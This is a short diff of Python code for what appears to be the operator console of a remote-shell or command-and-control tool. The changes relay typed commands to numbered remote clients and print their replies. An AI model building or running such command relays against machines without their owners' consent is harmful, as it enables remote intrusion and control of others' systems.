@@ -29,16 +29,22 @@ def shell():
     path = get_client_path()
     while len(path):
         command = input(f"{path}> ").strip()
+        if command == "exit":
+            server_session.send(command)
+            return
+        else:
+            server_session.send(command)
+            print(server_session.recv(1024).decode('utf-8'))
         path = get_client_path()
 
 def interact():
-    status = server_session.recv(1024).decode('utf-8')
-    if status == "clientnotfound":
+    client_no = server_session.recv(1024).decode('utf-8')
+    if client_no == "clientnotfound":
         print("Client Not Found")
     else:
         while True:
             if server_session == None: return
-            command = input("C> ").strip()
+            command = input(f"Client {client_no}> ").strip()
             if command == "exit":
                 server_session.send(command)
                 return
